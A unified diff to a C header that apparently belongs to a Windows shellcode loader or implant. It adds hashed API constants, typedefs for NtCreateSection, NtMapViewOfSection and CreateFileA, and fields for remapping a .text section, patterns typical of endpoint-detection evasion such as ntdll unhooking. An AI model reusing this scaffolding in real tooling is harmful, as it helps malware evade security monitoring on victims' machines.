@@ -18,6 +18,9 @@
 #define NTPROTECTVIRTUALMEMORY_HASH  0x082962c8
 #define NTFLUSHINSTRUCTIONCACHE_HASH 0x80183adf
 #define HASHED_NtDelayExecution      0x0a49084a
+#define HASHED_NtCreateSection       0xd02e20d0
+#define HASHED_NtMapViewOfSection    0x231f196a
+#define HASHED_CreateFileA           0xeb96c5fa
 
 
 #define HASHED_ntdll         0x22d3b5ed
@@ -107,6 +110,39 @@ typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
     PULONG  NumberOfBytesWritten
 );
 
+typedef HANDLE (WINAPI *pCreateFileA)(
+    LPCSTR                lpFileName,
+    DWORD                 dwDesiredAccess,
+    DWORD                 dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD                 dwCreationDisposition,
+    DWORD                 dwFlagsAndAttributes,
+    HANDLE                hTemplateFile
+);
+
+typedef NTSTATUS (NTAPI *pNtCreateSection)(
+    PHANDLE            SectionHandle,
+    ACCESS_MASK        DesiredAccess,
+    PVOID              ObjectAttributes,
+    PLARGE_INTEGER     MaximumSize,
+    ULONG              SectionPageProtection,
+    ULONG              AllocationAttributes,
+    HANDLE             FileHandle
+);
+
+typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
+    HANDLE          SectionHandle,
+    HANDLE          ProcessHandle,
+    PVOID           *BaseAddress,
+    ULONG_PTR       ZeroBits,
+    SIZE_T          CommitSize,
+    PLARGE_INTEGER  SectionOffset,
+    PSIZE_T         ViewSize,
+    DWORD           InheritDisposition,
+    ULONG           AllocationType,
+    ULONG           Win32Protect
+);
+
 
 typedef HANDLE (WINAPI *pCreateThread)(
     LPSECURITY_ATTRIBUTES  lpThreadAttributes,
@@ -163,6 +199,7 @@ typedef struct _Win32 {
     pCreateThread CreateThread;
     
     pCreateProcessA CreateProcessA;
+    pCreateFileA    CreateFileA;
     pFreeLibrary FreeLibrary;
 
 
@@ -172,6 +209,8 @@ typedef struct _Win32 {
     pNtFlushInstructionCache NtFlushInstructionCache;
     pNtFreeVirtualMemory NtFreeVirtualMemory;
     pNtWriteVirtualMemory NtWriteVirtualMemory;
+    pNtCreateSection      NtCreateSection;
+    pNtMapViewOfSection   NtMapViewOfSection;
     pNtDelayExecution    NtDelayExecution;
     pNtResumeThread      NtResumeThread;
     pNtGetContextThread NtGetContextThread;
@@ -195,4 +234,7 @@ typedef struct _Modules {
     HMODULE ntdll;
     HMODULE kernel32;
     HMODULE winhttp;
+    PVOID TextSection;
+    SIZE_T TextSize;
+    DWORD oldPerms;
 } Modules;
